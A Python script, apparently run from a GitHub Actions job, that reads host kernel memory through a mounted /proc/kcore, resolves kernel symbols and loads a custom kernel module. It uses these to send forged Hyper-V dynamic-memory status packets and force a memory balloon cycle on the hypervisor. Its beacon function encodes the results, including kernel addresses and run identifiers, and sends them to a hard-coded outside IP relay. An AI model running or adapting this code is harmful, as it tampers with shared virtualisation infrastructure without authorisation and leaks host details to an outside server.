#!/usr/bin/env python3
"""Bounded Dynamic Memory control: induce one stock balloon/unballoon cycle."""

import base64
import ctypes
import glob
import json
import os
import re
import struct
import time
import urllib.parse
import urllib.request

DM_CLASS = "{525074dc-8985-46e2-8057-a307dc18a502}"
MODULE = "/tmp/hvraw_dm_status.ko"
PROC = "/hostproc"
SYS = "/hostsys"
RELAY = "http://16.146.243.72:8450/MYTH_DM_CONTROL"


class KCore:
    def __init__(self, path):
        self.fd = os.open(path, os.O_RDONLY)
        header = os.pread(self.fd, 64, 0)
        fields = struct.unpack("<16sHHIQQQIHHHHHH", header)
        phoff, phentsize, phnum = fields[5], fields[9], fields[10]
        self.loads = []
        for index in range(phnum):
            raw = os.pread(self.fd, phentsize, phoff + index * phentsize)
            ptype, _, offset, vaddr, _, filesz, _, _ = struct.unpack(
                "<IIQQQQQQ", raw[:56])
            if ptype == 1 and filesz:
                self.loads.append((vaddr, vaddr + filesz, offset))

    def read(self, address, length):
        for start, end, offset in self.loads:
            if start <= address and address + length <= end:
                return os.pread(self.fd, length, offset + address - start)
        raise ValueError("address outside kcore loads")


def symbol_address(name):
    with open(PROC + "/kallsyms") as stream:
        for line in stream:
            fields = line.split()
            if len(fields) >= 3 and fields[2] == name and fields[1].lower() == "t":
                return int(fields[0], 16)
    raise KeyError(name)


def primary_relid():
    devices = [path for path in glob.glob(SYS + "/bus/vmbus/devices/*")
               if open(path + "/class_id").read().strip().lower() == DM_CLASS]
    if len(devices) != 1:
        raise RuntimeError("dynamic-memory device count=%d" % len(devices))
    channel_dirs = glob.glob(devices[0] + "/channels/*")
    primary = [path for path in channel_dirs
               if open(path + "/subchannel_id").read().strip() == "0"]
    if len(primary) != 1:
        raise RuntimeError("dynamic-memory primary channels=%r" % primary)
    return int(os.path.basename(primary[0])), os.path.basename(devices[0])


def channel_for_relid(kcore, relid):
    address = symbol_address("relid2channel")
    code = kcore.read(address, 160)
    candidates = []
    for index in range(len(code) - 7):
        if not (code[index] in (0x48, 0x4c) and code[index + 1] == 0x8b
                and code[index + 2] & 0xc7 == 0x05):
            continue
        displacement = struct.unpack("<i", code[index + 3:index + 7])[0]
        global_address = address + index + 7 + displacement
        try:
            array_address = struct.unpack("<Q", kcore.read(global_address, 8))[0]
            candidate = struct.unpack(
                "<Q", kcore.read(array_address + relid * 8, 8))[0]
        except (OSError, ValueError, struct.error):
            continue
        if array_address >> 48 == 0xffff and candidate >> 48 == 0xffff:
            candidates.append(candidate)
    if len(set(candidates)) != 1:
        raise RuntimeError("channel candidates=%r" % [hex(x) for x in candidates])
    return candidates[0]


def load_module():
    libc = ctypes.CDLL(None, use_errno=True)
    fd = os.open(MODULE, os.O_RDONLY)
    try:
        result = libc.syscall(313, fd, b"", 3)
        error = ctypes.get_errno() if result else 0
    finally:
        os.close(fd)
    if result and error != 17:
        raise OSError(error, "finit_module")


def trace_root():
    for root in (SYS + "/kernel/tracing", SYS + "/kernel/debug/tracing"):
        if os.path.exists(root + "/events/hyperv/balloon_status/enable"):
            return root
    # The UVM init mount namespace normally leaves tracefs unmounted. The
    # usermode-helper root used by this workflow has CAP_SYS_ADMIN; mount the
    # per-UVM tracefs only when needed and let allocation teardown remove it.
    candidate = SYS + "/kernel/tracing"
    os.makedirs(candidate, exist_ok=True)
    libc = ctypes.CDLL(None, use_errno=True)
    ctypes.set_errno(0)
    mounted = libc.mount(b"tracefs", candidate.encode(), b"tracefs", 0, b"")
    mount_error = ctypes.get_errno() if mounted else 0
    if mounted and mount_error != 16:
        raise OSError(mount_error, "mount tracefs")
    if os.path.exists(candidate + "/events/hyperv/balloon_status/enable"):
        return candidate
    raise RuntimeError("balloon_status tracepoint absent")


def read_trace(root):
    text = open(root + "/trace", errors="replace").read()
    pattern = (r"balloon_status: available (?P<available>\d+), committed "
               r"(?P<committed>\d+);.*pages_ballooned (?P<ballooned>\d+),")
    values = [{key: int(value) for key, value in match.groupdict().items()}
              for match in re.finditer(pattern, text)]
    return values


def write_param(name, value):
    open(SYS + "/module/hvraw_dm_status/parameters/" + name, "w").write(
        str(value) + "\n")


def send_phase(available, committed):
    write_param("available", available)
    write_param("committed", committed)
    write_param("burst", 20)
    write_param("interval_ms", 50)
    try:
        write_param("arm", 1)
        return 0
    except OSError as error:
        return error.errno


def beacon(result):
    try:
        encoded = base64.urlsafe_b64encode(
            json.dumps(result, sort_keys=True).encode()).decode()
        urllib.request.urlopen(RELAY + "?d=" + urllib.parse.quote(encoded),
                               timeout=3).read()
    except Exception:
        pass


def main():
    try:
        run_id = open("/tmp/b_run_id").read().strip()
    except OSError:
        run_id = os.environ.get("GITHUB_RUN_ID", "")
    result = {"status": "init", "run_id": run_id}
    root = None
    event_was_enabled = None
    pressure_path = SYS + "/module/hv_balloon/parameters/pressure_report_delay"
    pressure_was = None
    try:
        relid, device = primary_relid()
        kcore = KCore(PROC + "/kcore")
        channel = channel_for_relid(kcore, relid)
        send = symbol_address("vmbus_sendpacket")
        result.update(relid=relid, device=device, channel=hex(channel),
                      send_fn=hex(send), kernel=os.uname().release)
        load_module()
        write_param("channel", hex(channel))
        write_param("send_fn", hex(send))
        if os.path.exists(pressure_path):
            pressure_was = open(pressure_path).read().strip()
            open(pressure_path, "w").write("0\n")

        root = trace_root()
        event_path = root + "/events/hyperv/balloon_status/enable"
        event_was_enabled = open(event_path).read().strip()
        open(event_path, "w").write("1\n")
        time.sleep(2.2)
        baseline_values = read_trace(root)
        if not baseline_values:
            raise RuntimeError("no stock balloon_status sample")
        baseline = baseline_values[-1]
        result["baseline"] = baseline
        beacon({**result, "status": "baseline"})
        if baseline["ballooned"] != 0:
            result.update(status="ambiguous_existing_balloon_state")
            return

        peak = baseline["ballooned"]
        trigger_delta = None
        sends = []
        # Descend gradually so the first host request is bounded rather than
        # asking the stock driver to surrender the whole guest.
        for delta in (baseline["committed"],):
            low = max(0, baseline["committed"] - delta)
            for _ in range(8):
                sends.append({"phase": "low", "delta": delta,
                              "errno": send_phase(baseline["available"] + delta,
                                                   low)})
                latest = read_trace(root)[-1]
                peak = max(peak, latest["ballooned"])
                if peak > baseline["ballooned"]:
                    trigger_delta = delta
                    break
            if trigger_delta is not None:
                break

        result.update(peak_ballooned=peak, trigger_delta=trigger_delta)
        if trigger_delta is None:
            result.update(status="no_balloon_request", sends=sends[-8:])
            return

        # High committed pressure is guest-controlled and asks the balancer
        # to restore the pages it just removed. It remains below MemTotal-like
        # committed+available and avoids an absurd/malformed u64.
        high = baseline["committed"] + baseline["available"]
        final = read_trace(root)[-1]
        for _ in range(20):
            sends.append({"phase": "high",
                          "errno": send_phase(0, high)})
            final = read_trace(root)[-1]
            if final["ballooned"] <= baseline["ballooned"]:
                break

        result.update(status=("cycle_complete" if
                              final["ballooned"] <= baseline["ballooned"]
                              else "balloon_only"),
                      final=final, high_committed=high, sends=sends[-12:])
    except Exception as error:
        result.update(status="error", error="%s:%s" %
                      (type(error).__name__, error))
    finally:
        if root and event_was_enabled == "0":
            try:
                open(root + "/events/hyperv/balloon_status/enable", "w").write("0\n")
            except OSError:
                pass
        if pressure_was is not None:
            try:
                open(pressure_path, "w").write(pressure_was + "\n")
            except OSError:
                pass
        open("/tmp/dm-control-result.json", "w").write(
            json.dumps(result, sort_keys=True) + "\n")
        beacon(result)


if __name__ == "__main__":
    main()
